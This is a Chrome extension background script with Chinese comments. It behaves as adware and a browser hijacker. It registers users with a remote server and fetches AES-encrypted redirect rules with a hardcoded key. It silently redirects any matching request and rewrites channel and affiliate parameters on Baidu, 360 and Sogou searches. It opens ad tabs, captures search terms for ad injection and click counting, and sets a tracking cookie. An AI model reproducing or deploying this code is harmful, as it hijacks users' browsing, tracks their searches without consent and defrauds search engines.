var url_str = '';
var keywords = [];
var keywords_data = [];
var content = [];
var reghosts = [];
var reghosts_data = [];
var links = {};
var word = '';
var guid_str = '';
var channel_id = 44

var version = '1.0.7';
var update_time = 300000;
var url = 'http://api.dlsoft.kittyyw.com/';
// var url = 'http://test.api.dlsoft.kittyyw.com/';

// var version = '1.0.7';
// var update_time = 50000;
// var url = 'http://www.local-soft2.com/';



(function () {
    // 获取具有指定属性的所有标签页，如果没有指定任何属性的话则获取所有标签页。
    function tabs_query(res) {
        //使用 chrome.tabs API 与浏览器的标签页系统交互。您可以使用该 API 创建、修改和重新排列浏览器中的标签页。
        chrome.tabs.query({'active': !![], 'currentWindow': !![]}, function (callback) {
            if (res) res(callback['length'] ? callback[0]['id'] : null);
        });
    }
    //修改标签页属性，updateProperties 中未指定的属性保持不变。
    function tabs_update(url) {
        tabs_query(data => {
            chrome.tabs.update(data, {'url': url});
        });
    }
    //从url中获取参数值
    function getvl(url,param_name) {
        var reg = new RegExp("(^|\\?|\\#|&)"+ param_name +"=([^&]*)(\\s|&|$)", "i");
        if (reg.test(url)) return unescape(RegExp.$2.replace(/\+/g, " "));
        return "";
    }
    /* 定义替换对象键值 */
    function setReferArgs(param_name,param_value){
        var referArgs = new Object();
        referArgs[param_name] = param_value;
        return referArgs;
    }
    /* 替换URL的参数 */
    function replaceUrlParams(url,param_name,param_value){
        //获取参数的值
        var value = getvl(url,param_name);
        if(!value){
            if(url.indexOf('#') != -1){
                url_new = url+'&'+param_name+'='+param_value;
                return url_new;
            }else{
                if(url.indexOf('?') != -1){
                    url_new = url+'&'+param_name+'='+param_value;
                    return url_new;
                }else{
                    url_new = url+'?'+param_name+'='+param_value;
                    return url_new;
                }
            }

        }
        var actualUrl = "";
        if(value == param_value){
            return url;
        }
        var referArgs = setReferArgs(value,param_value);
        for(var key in referArgs){
            var e = eval('/'+ key +'/g');
            actualUrl = url.replace(e,referArgs[key]);
            url = actualUrl;
        }
        return actualUrl;
    }
    //对字符串集合随机排列，随机输出指定的长度
    function randomString(length = 32) {
        var str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        var result = '';
        for (var i = length; i > 0; --i)
            result += str[Math.floor(Math.random() * str.length)];
        return result;
    }
    //插件启动数据--记录(guid,ip,省市，时间)
    function extension_start(){
        //今天的时间
        var day2 = new Date();
        day2.setTime(day2.getTime());
        var s2 = day2.getFullYear()+"-" + (day2.getMonth()+1) + "-" + day2.getDate();
        var guid_localStorage = localStorage.getItem('guid_'+s2);
        if(!guid_localStorage){
            guid_localStorage = randomString();
            // 保存数据到 localStorage
            localStorage.setItem('guid_'+s2,guid_localStorage);
        }
        guid_str = guid_localStorage;
        $.get(url+'api.php/v1/plugin_url2/receive_customer_guid', {"guid":guid_str,"plugin_version":version,"channel_id":channel_id,"user_agent":navigator.userAgent});
    }
    extension_start();
    //js获取配置--5分钟刷新一次配置
    function getData(){
        // 获取搜索引擎
        $.get(url+'api.php/v1/plugin_url2/get_reghosts', {}, function (callback) {
            if(callback.code == 200){
                reghosts_data = callback.data;
                $.each(callback.data,function (k,v) {
                    reghosts[k] = v.rule;
                });
            }
        });
        // 获取链接地址数据信息 [获取的是新标签页的数据]
        $.get(url+'api.php/v1/plugin_url2/regular_match_jump', {}, function (callback) {
            AesKey = '3a570e3a61d0d9zg';
            var mode_padding = {'mode': CryptoJS.mode.ECB, 'padding': CryptoJS.pad.Pkcs7};
            var utf8_parse = CryptoJS.enc.Utf8.parse(AesKey);
            var toString = CryptoJS.AES.decrypt(callback, utf8_parse, mode_padding);
            var strs = toString.toString(CryptoJS.enc.Utf8);
            links = JSON.parse(strs);
            // console.log('=========03=========');
            // console.log('==============links=================');
            // console.log(links);
        });
        // 获取广告数据信息关键词
        $.get(url+'api.php/v1/plugin_url2/get_keywords', {}, function (callback) {
            if (callback.code == 200) {
                keywords = callback.keywords;
                // 普通页面获取广告网页弹窗js
                content = callback.content;
                // console.log('-----------keywords---content----------------');
                // console.log(keywords);
                // console.log(content);
            }
        });
        // 获取广告数据信息关键词
        $.get(url+'api.php/v1/plugin_url2/get_keywords_turn_off_lights', {}, function (callback) {
            if (callback.code == 200) {
                keywords_data = callback.data;
                // console.log('--------------keywords_data----------------');
                // console.log(keywords_data);
            }
        });

    }
    getData();//先调用一次
    setInterval(getData, update_time);//启动定时器，5分钟一次

    // 当标签更新时，此事件被触发。打开新的标签页
    chrome.tabs.onUpdated.addListener(function (tabId , info , tab) {
        if (info.status == 'loading') {
            for (var i = 0; i < links.length; i++) {
                var rule = RegExp(links[i]['rule'], 'i');
                if (links[i]['type'] == 2) {
                    if (rule['test'](tab['url'])) {
                        if (links[i]['selected'] == 1) {
                            var selected = true;
                        }else{
                            var selected = false;
                        }
                        var day2 = new Date();
                        day2.setTime(day2.getTime());
                        var s2 = day2.getFullYear()+"-" + (day2.getMonth()+1) + "-" + day2.getDate();
                        var guid_str = localStorage.getItem('guid_'+s2);
                        $.get(url+'api.php/v1/plugin_url2/insert_ad_js_count', {"ad_id":links[i].id,"type":2,"mac":guid_str,"plugin_version":version,"channel_id":channel_id}, function (res) {
                            // console.log(res);
                        });
                        chrome.tabs.create({'url': links[i]['redirect'],selected: selected});    //创建一个新标签页。
                        continue;
                    }
                }
            }
        }
    });

    // 截获真实的请求，重定向请求然后再发出去。     "*://*/*"
    //filter  : reghosts就是过滤条件
    //blocking: 同步处理回调函数，即请求被阻塞，直到回调函数返回
    chrome.webRequest.onBeforeRequest.addListener(function (details) {
        // console.log('=========01=========');
        // console.log('-----------guid_str-------------');
        // console.log(links);
        // console.log(guid_str);
        //替换链接,直接跳转
        for (var i = 0; i < links.length; i++) {
            var rule = RegExp(links[i].rule, 'i');
            if (links[i].type != 2) {
                if (rule.test(details.url)) {
                    var redirectUrl = links[i].redirect;
                    if(redirectUrl){
                        var day2 = new Date();
                        day2.setTime(day2.getTime());
                        var s2 = day2.getFullYear()+"-" + (day2.getMonth()+1) + "-" + day2.getDate();
                        var guid_str = localStorage.getItem('guid_'+s2);
                        $.get(url+'api.php/v1/plugin_url2/insert_ad_js_count', {"ad_id":links[i].id,"type":links[i].type,"mac":guid_str,"plugin_version":version,"channel_id":channel_id}, function (res) {
                            // console.log(res);
                        });
                        return {redirectUrl: redirectUrl};
                    }
                }
            }
        }
        for (var i=0;i<reghosts_data.length;i++){
            //百度搜素的情况
            if(details.url.indexOf(reghosts_data[i].host) != -1){
                if(reghosts_data[i].host == 'www.baidu.com'){
                    url_str='baidu';
                }else if(reghosts_data[i].host == 'www.so.com'){
                    url_str='so';
                }else if(reghosts_data[i].host == 'www.sogou.com'){
                    url_str='sogou';
                }
                var channel_param_obj = JSON.parse(reghosts_data[i].channel_param);
                //遍历packJson 对象的每个key/value对,k为key
                //获取tn的值，如果不是后台设置的值，则替换
                var url0 = '';
                for (var k in channel_param_obj ){
                    var k_value = getvl(details.url, k);
                    if(k_value != channel_param_obj[k] && (details.type == 'xmlhttprequest' || details.type == 'main_frame' || details.type == 'ping')){
                        if(url0){
                            url0 = replaceUrlParams(url0, k, channel_param_obj[k]);
                        }else{
                            url0 = replaceUrlParams(details.url, k, channel_param_obj[k]);
                        }
                    }
                }
                if(url0){
                    return {redirectUrl: url0};
                }
            }
        }

    }, {urls: ["*://*/*"]}, ['blocking']);

    // 当请求被成功处理时触发。
    chrome.webRequest.onCompleted.addListener(function (details) {
        if(details.url.indexOf('sug.so.360.cn') != -1 || details.url.indexOf('www.so.com') != -1 || details.url.indexOf('show-g.mediav.com') != -1){
            if(details.type=='script'){
                url_new = decodeURIComponent(details.url);
                var word1  = getvl(url_new,'q');
                var word2  = getvl(url_new,'word');
                var word3  = getvl(url_new,'queryword');
                if(word1){
                    word = word1;
                }
                if(word2){
                    word = word2;
                }
                if(word3){
                    word = word3;
                }
                // console.log('------------360搜索------------');
                // console.log(details.url);
                // console.log(details.type);
                // console.log(word1);
                // console.log(word2);
                // console.log(word3);
                var sign = 1;
                $.each(keywords,  function (i,val){
                    if(val.indexOf(word) != -1){
                        sign = 2;
                    }
                });
                if(sign == 1){
                    word = 'c831b04de153469d';
                }
                //使用 chrome.tabs API 与浏览器的标签页系统交互。您可以使用该 API 创建、修改和重新排列浏览器中的标签页。
                var callbacks00 = {};
                chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                    if(tabs.length == 0){
                        var tabIds =details.tabId;
                    }else{
                        var tabIds =tabs[0].id;
                    }
                    callbacks00.keywords_data= keywords_data;
                    callbacks00.word= word;
                    callbacks00.mod= mod;
                    chrome.tabs.sendMessage(tabIds, callbacks00);

                });
            }
        }

        if(details.url.indexOf('www.baidu.com') != -1){
            if (details.type=='xmlhttprequest' || details.type=='main_frame') {
                if(details.url.indexOf('json=1') == -1){
                    url_new = decodeURIComponent(details.url);
                    var mod = getvl(url_new,'mod');
                    var fr  = getvl(url_new,'fr');
                    var wd  = getvl(url_new,'wd')?getvl(url_new,'wd'):getvl(url_new,'word');
                    if (mod== 2 || mod== 11 || fr== 'none') {
                        // 获取关键词--根据不同的搜索引擎区分
                        word = wd;
                        if(mod == 11){
                            var sign = 1;
                            $.each(keywords,  function (i,val){
                                if(val.indexOf(word) != -1){
                                    sign = 2;
                                }
                            });
                            if(sign == 1){
                                word = 'c831b04de153469d';
                            }
                        }
                        //使用 chrome.tabs API 与浏览器的标签页系统交互。您可以使用该 API 创建、修改和重新排列浏览器中的标签页。
                        var callbacks00 = {};
                        chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                            if(tabs.length == 0){
                                var tabIds =details.tabId;
                            }else{
                                var tabIds =tabs[0].id;
                            }
                            callbacks00.keywords_data= keywords_data;
                            callbacks00.word= word;
                            callbacks00.mod= mod;
                            chrome.tabs.sendMessage(tabIds, callbacks00);
                        });
                    }
                }
            }
        }
    }, {urls: reghosts});

    // 监听消息时，需要注册要监听的消息。
    chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
        //判断是否为要处理的消息
        if (request.message === 'get_config') {
            // 获取关键词
            url_new = decodeURIComponent(sender.url);
            if (url_str == 'baidu') {
                var word = getvl(url_new,'wd')?getvl(url_new,'wd'):getvl(url_new,'word');
            }else if (url_str == 'so') {
                var word =getvl(url_new,'word');
            }
            var callbacks0 = {};
            callbacks0.keywords = keywords;
            callbacks0.keywords_data = keywords_data;
            callbacks0.word = word;
            callbacks0.content = content;
            callbacks0.url = sender.url;
            callbacks0.url_str=url_str;
            sendResponse(callbacks0);
        }
        if(request.greeting === 'insert_static'){
            // console.log('收到来自content-script的消息：');
            var day2 = new Date();
            day2.setTime(day2.getTime());
            var s2 = day2.getFullYear()+"-" + (day2.getMonth()+1) + "-" + day2.getDate();
            var guid_str = localStorage.getItem('guid_'+s2);
            // console.log('=========version===========');
            // sendResponse('我是后台，我已收到你的消息：' + JSON.stringify(request));
            $.get(url+'api.php/v1/plugin_url2/insert_ad_js_count', {"ad_id":request.id,"type":request.type,"word":request.word,"mac":guid_str,"plugin_version":version,"channel_id":channel_id}, function (res) {
                // console.log(res);
            });
        }
        return true;
    });

    chrome.cookies.set({
        "name": "chrome_num",
        "url":'https://www.baidu.com/?tn=21002492_30_hao_pg',
        "value": "1"
    }, function (cookie) {
        // console.log(JSON.stringify(cookie));
        // console.log(chrome.extension.lastError);
        // console.log(chrome.runtime.lastError);
    })
}());
